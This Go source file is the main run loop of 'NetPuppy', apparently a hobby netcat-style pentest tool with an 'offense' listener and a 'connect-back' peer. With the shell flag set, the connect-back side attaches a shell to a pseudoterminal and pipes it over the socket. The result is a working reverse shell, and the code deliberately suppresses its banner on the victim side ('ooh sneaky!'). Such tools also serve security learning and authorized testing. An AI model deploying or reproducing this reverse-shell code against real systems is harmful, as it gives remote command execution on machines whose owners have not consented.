package cmd

import (
	"bufio"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"os/signal"
	"time"

	// NetPuppy pkgs:
	"github.com/trshpuppy/netpuppy/cmd/conn"
	"github.com/trshpuppy/netpuppy/cmd/shell"
	"github.com/trshpuppy/netpuppy/pkg/pty"
	"github.com/trshpuppy/netpuppy/utils"
)

func Run(c conn.ConnectionGetter) {
	// Parse flags from user, attach to struct:
	flagStruct := utils.GetFlags()

	// Create peer instance based on user input:
	var thisPeer *conn.Peer = conn.CreatePeer(flagStruct.Port, flagStruct.Host, flagStruct.Listen, flagStruct.Shell)

	// Print banner, but don't print if we are the peer running the shell (ooh sneaky!):
	if !thisPeer.Shell {
		fmt.Printf("%s", utils.Banner())

		// Update user:
		var updateUserBanner string = utils.UserSelectionBanner(thisPeer.ConnectionType, thisPeer.Address, thisPeer.RPort, thisPeer.LPort)
		fmt.Println(updateUserBanner)
	}

	// Make connection:
	var socketInterface conn.SocketInterface
	if thisPeer.ConnectionType == "offense" {
		socketInterface = c.GetConnectionFromListener(thisPeer.LPort, thisPeer.Address)
	} else {
		socketInterface = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address, thisPeer.Shell)
	}
	defer socketInterface.Close()

	// If shell flag is true, start shell:
	//	var shellInterface shell.ShellInterface
	var shellInterface *shell.RealShell
	var shellErr error

	if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
		var realShellGetter shell.RealShellGetter
		shellInterface, shellErr = realShellGetter.GetConnectBackInitiatedShell()

		if shellErr != nil {
			errString := "Error starting shell: " + shellErr.Error()
			socketInterface.Write([]byte(errString))
			socketInterface.Close()
			os.Exit(1)
		}
	}

	// Start SIGINT go routine & start channel to listen for SIGINT:
	listenForSIGINT(socketInterface, thisPeer)

	// ................................................. CONNECT-BACK w/ SHELL .................................................
	// If we are the connect-back peer & the user wants a shell, start the shell here:
	if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
		// Get pts and ptm device files:
		master, pts, err := pty.GetPseudoterminalDevices()
		if err != nil {
			// Send error through socket, then quit:
			errString := "Error starting shell: " + err.Error()
			socketInterface.Write([]byte(errString))
			socketInterface.Close()
			os.Exit(1)
		}

		defer pts.Close()
		defer master.Close()

		// Hook up slave device to bash process:
		shellInterface.Shell.Stdin = pts
		shellInterface.Shell.Stdout = pts
		shellInterface.Shell.Stderr = pts

		// Start shell:
		err = shellInterface.StartShell()
		if err != nil {
			// Remember to close the device files:
			pts.Close()
			master.Close()

			// Write error to socket, close socket, quit:
			errString := "Error starting shell: " + err.Error()
			socketInterface.Write([]byte(errString))
			socketInterface.Close()
			os.Exit(1)
		}

		var routineErr error
		commandPending := true

		// Copy output from master device to socket:
		go func(socket conn.SocketInterface, master *os.File) {
			_, err := io.Copy(*socket.GetWriter(), master)
			if err != nil {
				routineErr = fmt.Errorf("Error copying master device to socket: %v\n", err)
				return
			}
			commandPending = false
		}(socketInterface, master)

		// Copy output from socket to master device:
		go func(socket conn.SocketInterface, master *os.File) {
			commandPending = true
			_, err := io.Copy(master, *socket.GetReader())
			if err != nil {
				routineErr = fmt.Errorf("Error copying socket to master device: %v\n", err)
				return
			}
		}(socketInterface, master)

		for {
			if routineErr != nil {
				// Send error through socket, then quit:
				// Remember to close the device files:
				pts.Close()
				master.Close()

				socketInterface.Write([]byte(routineErr.Error()))
				socketInterface.Close()
				os.Exit(1)
			}

			if commandPending {
				// Timeout:
				time.Sleep(3 * time.Millisecond)
			}
		}
	} else {
		// ................................................. OG STRAT .................................................
		// ............................ This is for the listener peer;
		//								We have 4 go routines, one for reading input from the user,
		//								one for reading the socket, one for writing to the socket,
		//								and one for printing socket output to the user.
		//
		//								There are 2 channels. We use a case select block to check
		//								the channels for data. One channel has user input, the other
		//								has socket data. If there is data in either, then we call either
		//								writeToSocket() or printToUser(). If there isn't data in either,
		//								we timeout for 69 (nice) milliseconds.
		//
		//								This strat seems to run more smoothly than the io.Copy() strat below
		//								(even though it was the opposite case for the connect back peer).
		// ...........................

		// Go routine to read user input:
		readUserInput := func(c chan<- string, stopSignalChan <-chan bool) {
			// For loop starts, when there is user input
			// .... (they type and then press Enter [which is a bug btw])
			// .... the input is sent into the userInput channel as a string.
			for {
				select {
				case stopSignal := <-stopSignalChan:
					if stopSignal {
						return
					}
				default:
					userReader := bufio.NewReader(os.Stdin)
					userInput, err := userReader.ReadString('\n')
					if err != nil {
						log.Fatalf("Error reading input from user: %v\n", err)
					}
					c <- userInput
				}
			}
		}

		// Go routine to read data from socket:
		readSocket := func(socketInterface conn.SocketInterface, c chan<- []byte, stopSignalChan <-chan bool) {
			// For loop starts & we try to read the socket,
			// .... if there is data, we put it in the dataReadFromSocket channel.
			// .... If there is an error, we check the error type
			// .... (to handle EOF since we don't care about EOF)
			for {
				select {
				case stopSignal := <-stopSignalChan:
					if stopSignal {
						return
					}
				default:
					dataReadFromSocket, err := socketInterface.Read()
					if len(dataReadFromSocket) > 0 {
						c <- dataReadFromSocket
					}
					if err != nil {
						if errors.Is(err, io.EOF) {
							continue
						} else {
							log.Fatalf("Error reading data from socket: %v\n", err)
						}
					}
				}
			}
		}

		// Go routine to write to socket:
		writeToSocket := func(data string, socketInterface conn.SocketInterface) {
			// Called from the select block (user has entered input)
			// .... Check length so we can clear channel, but not send blank data:
			if len(data) > 0 {
				_, erR := socketInterface.Write([]byte(data))
				if erR != nil {
					log.Fatalf("Error writing user input buffer to socket: %v\n", erR)
				}
			}
		}

		// Go routine to print data from socket to user:
		printToUser := func(data []byte) {
			// Called from the select block (data has come in from the socket)
			// .... Check the length:
			if len(data) > 0 {
				_, err := os.Stdout.Write(data)
				if err != nil {
					log.Fatalf("Error printing data to user: %v\n", err)
				}
			}
		}

		// .......................... Read routines & channels ....................
		// Make channels for reaading from user & socket
		// .... & defer their close until Run() returns:
		userInputChan := make(chan string)
		socketDataChan := make(chan []byte)
		readSocketCloseSignalChan := make(chan bool)
		readUserInputCloseSignalChan := make(chan bool)
		defer func() {
			// Might be over kill, but send signal to routines,
			// .... then close channels:
			readSocketCloseSignalChan <- true
			readUserInputCloseSignalChan <- true

			close(readSocketCloseSignalChan)
			close(readUserInputCloseSignalChan)
			close(userInputChan)
			close(socketDataChan)
		}()

		// Start go routines to read from socket and user:
		go readSocket(socketInterface, socketDataChan, readSocketCloseSignalChan)
		go readUserInput(userInputChan, readUserInputCloseSignalChan)
		// .........................................................................

		// This for loop uses a select block to check the channels from the read routines,
		// .... if either channel has data in it, then we call the write routines
		// .... which write to the socket OR print to the user
		// .... otherwise, we timeout.
		for {
			select {
			case dataFromUser := <-userInputChan:
				go writeToSocket(dataFromUser, socketInterface)
			case dataFromSocket := <-socketDataChan:
				go printToUser(dataFromSocket)
			default:
				// Timeout:
				time.Sleep(69 * time.Millisecond)
			}
		}

		// ................................................. IO COPY STRAT .................................................
		// ................................ This accomplishes the same as the OG STRAT (above)
		//									but for some reason is way slower and laggier...
		//									Not sure why since I also use this strat on the
		//    								connect-back/ rev-shell peer and it really *seemed*
		//									to help with speed & smooth output.
		//
		//									Anyway, instead of using channels and go routines,
		//									we just directly hook up the various pipes using
		//									io.Copy. We don't intercept or read the data passing
		//									between them at all.
		// ................................

		// // If we are not the connect-back peer, we are the listener peer:
		// // Start go routines to read from socket and user:
		// //writingToSocket := false
		// var routineErr error

		// // Copy output from socket to Stdout:
		// go func(socket conn.SocketInterface, osStdout *os.File) {
		// 	_, err := io.Copy(osStdout, *socket.GetReader())
		// 	if err != nil {
		// 		routineErr = fmt.Errorf("Error copying socket to Stdout: %v\n", err)
		// 		return
		// 	}
		// 	// writingToSocket = false
		// }(socketInterface, os.Stdout)

		// // Copy input from Stdin to socket:
		// go func(socket conn.SocketInterface, osStdin *os.File) {
		// 	_, err := io.Copy(*socket.GetWriter(), osStdin)
		// 	if err != nil {
		// 		routineErr = fmt.Errorf("Error copying Stdin to socket: %v\n", err)
		// 		return
		// 	}
		// 	// writingToSocket = true
		// }(socketInterface, os.Stdin)

		// for {
		// 	if routineErr != nil {
		// 		// Send error through socket, then quit:
		// 		socketInterface.Write([]byte(routineErr.Error()))
		// 		socketInterface.Close()
		// 		os.Exit(1)
		// 	}

		// 	// if writingToSocket {
		// 	// 	// Timeout:
		// 	// 	time.Sleep(3 * time.Millisecond)
		// 	// }
		// }
	}
}

func listenForSIGINT(connection conn.SocketInterface, thisPeer *conn.Peer) { // POINTER: passing Peer by reference (we ACTUALLY want to close it)
	// If SIGINT: close connection, exit w/ code 2
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	go func() {
		for sig := range signalChan {
			fmt.Printf("Signal: %v\n", sig)

			// Maybe have a check here to send the signal to the socket
			// .... rather than quit netpuppy (since the user could be trying)
			// .... to send a signal to the rev shell
			if sig.String() == "interrupt" {
				if !thisPeer.Shell {
					fmt.Printf("signal: %v\n", sig)
				}
				connection.Close()
				os.Exit(2)
			}
		}
	}()
}
